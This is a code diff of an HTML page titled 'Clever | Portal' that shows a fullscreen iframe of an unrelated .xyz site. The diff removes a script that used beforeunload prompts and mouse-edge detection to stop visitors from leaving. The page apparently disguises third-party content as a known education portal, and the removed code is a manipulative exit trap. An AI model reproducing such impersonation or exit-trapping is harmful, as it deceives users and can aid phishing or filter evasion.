@@ -1,206 +1,29 @@
-**index.html**
-
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clever | Portal</title>
-    <link rel="icon" type="image/png" href="favicon.png">
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #000;
-            font-family: sans-serif;
-        }
-
-        iframe {
-            width: 100vw;
-            height: 100vh;
-            border: none;
-            display: block;
-        }
-
-        #exit-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(5px);
-            animation: fadeIn 0.3s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal {
-            background: #1a1a1a;
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            border: 2px solid #ff4d4d;
-            box-shadow: 0 0 30px rgba(255, 77, 77, 0.3);
-            max-width: 400px;
-            animation: slideUp 0.3s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal h2 {
-            margin-top: 0;
-            color: #ff4d4d;
-            font-size: 24px;
-        }
-
-        .modal p {
-            margin-bottom: 25px;
-            font-size: 16px;
-            color: #ccc;
-            line-height: 1.5;
-        }
-
-        .modal button {
-            background: #ff4d4d;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin: 5px;
-        }
-
-        .modal button:hover {
-            background: #ff1a1a;
-            transform: scale(1.05);
-        }
-
-        .modal button:active {
-            transform: scale(0.98);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clever | Portal</title>
+  <link rel="icon" type="image/png" href="favicon.png">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: #000;
+      font-family: sans-serif;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      display: block;
+    }
+  </style>
 </head>
 <body>
-    <iframe src="https://topsaugatr.analisismx.xyz/" allow="fullscreen" loading="lazy"></iframe>
-
-    <div id="exit-overlay">
-        <div class="modal">
-            <h2>Wait!</h2>
-            <p>Are you sure you want to leave the portal? Your session may be interrupted.</p>
-            <button id="cancel-exit">Stay on Page</button>
-        </div>
-    </div>
-
-    <script src="script.js" defer></script>
+  <iframe src="https://topsaugatr.analisismx.xyz/" allow="fullscreen" loading="lazy"></iframe>
 </body>
 </html>
-```
-
-**script.js**
-
-```javascript
-const overlay = document.getElementById('exit-overlay');
-const cancelBtn = document.getElementById('cancel-exit');
-
-// Debounce and throttle configuration
-let mouseOutTriggered = false;
-const MOUSE_OUT_COOLDOWN = 500;
-
-// 1. Browser-level warning
-window.addEventListener('beforeunload', (e) => {
-    e.preventDefault();
-    e.returnValue = '';
-});
-
-// 2. Enhanced mouse-out detection
-document.addEventListener('mousemove', (e) => {
-    const threshold = 5;
-
-    if (e.clientY <= threshold && e.clientY >= -10) {
-        triggerExitModal();
-    }
-
-    if ((e.clientX <= threshold || e.clientX >= window.innerWidth - threshold) && e.clientY > 0) {
-        if (!mouseOutTriggered) {
-            triggerExitModal();
-        }
-    }
-});
-
-// Alternative detection: mouseleave on document
-document.addEventListener('mouseleave', (e) => {
-    if (e.clientY < 0 || e.clientX < 0 || e.clientX > window.innerWidth) {
-        triggerExitModal();
-    }
-});
-
-// Pointer events for mobile/tablet support
-document.addEventListener('pointerleave', (e) => {
-    if (e.clientY < 0 || e.clientX < 0 || e.clientX > window.innerWidth) {
-        triggerExitModal();
-    }
-});
-
-// Window focus loss detection
-window.addEventListener('blur', () => {
-    // triggerExitModal();
-});
-
-function triggerExitModal() {
-    if (!mouseOutTriggered) {
-        overlay.style.display = 'flex';
-        mouseOutTriggered = true;
-
-        setTimeout(() => {
-            mouseOutTriggered = false;
-        }, MOUSE_OUT_COOLDOWN);
-    }
-}
-
-// 3. Cancel button
-cancelBtn.addEventListener('click', () => {
-    overlay.style.display = 'none';
-    mouseOutTriggered = false;
-});
-
-// 4. Close modal when clicking outside
-overlay.addEventListener('click', (e) => {
-    if (e.target === overlay) {
-        overlay.style.display = 'none';
-        mouseOutTriggered = false;
-    }
-});
-
-// 5. Escape key handling
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' && overlay.style.display === 'flex') {
-        overlay.style.display = 'none';
-        mouseOutTriggered = false;
-    }
-});
-```
